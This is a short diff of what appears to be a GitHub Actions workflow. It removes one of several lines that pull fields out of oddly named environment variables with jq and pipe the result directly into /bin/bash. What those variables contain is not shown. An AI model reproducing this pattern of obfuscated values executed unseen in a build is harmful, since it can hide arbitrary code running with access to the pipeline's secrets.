@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$ki0487" | jq -r .cdx8914 | /bin/bash
           printf '%s' "$i46" | jq -r .ueez32 | /bin/bash
           printf '%s' "$pzo5" | jq -r .dpoii8 | /bin/bash
-          printf '%s' "$pji53332" | jq -r .d1 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
